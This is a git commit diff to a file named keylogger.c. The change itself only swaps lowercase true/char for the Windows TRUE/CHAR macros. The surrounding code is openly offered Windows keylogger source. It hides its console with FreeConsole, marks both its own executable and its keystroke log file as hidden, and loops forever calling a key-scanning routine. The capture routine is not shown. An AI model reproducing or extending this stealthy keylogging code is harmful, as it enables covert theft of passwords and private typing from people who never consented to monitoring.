a71f56c83a387510db48ec2513d2731b1b21be10
cybersecuritydef <155002701+cybersecuritydef@users.noreply.github.com>
2024-09-03 09:29:48 +0300

    Update keylogger.c

--- keylogger.c
+++ keylogger.c
@@ -12,19 +12,19 @@ bool hide(const char *path){
     DWORD attr = 0;
     attr = GetFileAttributesA(path);
     if(attr & FILE_ATTRIBUTE_HIDDEN)
-        return true;
+        return TRUE;
     attr |= FILE_ATTRIBUTE_HIDDEN;
     return SetFileAttributes(path, attr);
 }
 
 int main(int argc, char **argv){
-    char cur_path[LEN_VALUE_NAME] = {'\0'};
+    CHAR cur_path[LEN_VALUE_NAME] = {'\0'};
     FreeConsole();
     GetModuleFileName(NULL, cur_path, sizeof(cur_path));
     hide(cur_path);
     sprintf_s(cur_path, LEN_VALUE_NAME, "%s\\%s", dirname(cur_path), KEY_FILE);
     hide(cur_path);
-    while(true){
+    while(TRUE){
         scan_code(cur_path);
     }
     return 0;
